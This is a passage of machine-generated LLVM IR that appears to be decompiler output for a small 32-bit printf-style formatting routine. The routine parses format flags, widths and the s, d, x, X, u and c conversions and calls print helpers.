  %v22_8048516 = inttoptr i32 %v5_8048516 to i8*
  %v1_804851c = add i8 %stack_var_-36.0, 48
  store i8 %v1_804851c, i8* %v22_8048516, align 1
  %v5_804853b = sext i32 %v13_80484fc to i64
  %v5_804853e = icmp eq i32 %v13_80484fc, 0
  %v1_8048542 = icmp eq i1 %v5_804853e, false
  br i1 %v1_8048542, label %dec_label_pc_80484ee, label %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge

dec_label_pc_804853e.dec_label_pc_8048544_crit_edge: ; preds = %dec_label_pc_8048516
  store i8* %v22_8048516, i8** %stack_var_-40, align 4
  br label %dec_label_pc_8048544

dec_label_pc_8048544:                             ; preds = %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge, %dec_label_pc_80484dd
  %v3_8048581622 = phi i32 [ %v5_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %v15_80484e0, %dec_label_pc_80484dd ]
  %v3_8048572 = phi i8* [ %v22_8048516, %dec_label_pc_804853e.dec_label_pc_8048544_crit_edge ], [ %tmp48, %dec_label_pc_80484dd ]
  %v4_8048544 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_8048544, label %dec_label_pc_804857b, label %dec_label_pc_804854a

dec_label_pc_804854a:                             ; preds = %dec_label_pc_8048544
  %v4_804854a = icmp eq i32 %tmp31, 0
  br i1 %v4_804854a, label %dec_label_pc_8048572, label %dec_label_pc_8048550

dec_label_pc_8048550:                             ; preds = %dec_label_pc_804854a
  %v1_8048553 = and i32 %tmp32, 2
  %v2_8048553 = icmp eq i32 %v1_8048553, 0
  br i1 %v2_8048553, label %dec_label_pc_8048572, label %dec_label_pc_804855a

dec_label_pc_804855a:                             ; preds = %dec_label_pc_8048550
  %v3_8048562 = inttoptr i32 %arg1 to i32*
  %v4_8048562 = call i32 @printchar(i32* %v3_8048562, i32 45)
  %v4_804856d = add i32 %tmp31, -1
  br label %dec_label_pc_804857b

dec_label_pc_8048572:                             ; preds = %dec_label_pc_8048550, %dec_label_pc_804854a
  %v4_8048572 = ptrtoint i8* %v3_8048572 to i32
  %v5_8048572 = add i32 %v4_8048572, -1
  %v22_8048572 = inttoptr i32 %v5_8048572 to i8*
  store i8* %v22_8048572, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048572, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80485816.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804857b

dec_label_pc_804857b:                             ; preds = %dec_label_pc_8048544, %dec_label_pc_804855a, %dec_label_pc_8048572
  %v3_80485816 = phi i32 [ %v3_8048581622, %dec_label_pc_8048544 ], [ %v3_80485816.pre, %dec_label_pc_8048572 ], [ %v3_8048581622, %dec_label_pc_804855a ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_8048544 ], [ %tmp31, %dec_label_pc_8048572 ], [ %v4_804856d, %dec_label_pc_804855a ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_8048544 ], [ 0, %dec_label_pc_8048572 ], [ 1, %dec_label_pc_804855a ]
  %v1_8048587.cast = inttoptr i32 %v3_80485816 to i8*
  %v6_8048587 = call i32 @prints(i32 %arg1, i8* %v1_8048587.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048592 = add i32 %v6_8048587, %stack_var_-28.0
  store i32 %v2_8048592, i32* @edx, align 4
  br label %dec_label_pc_8048597

dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8055d3d.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
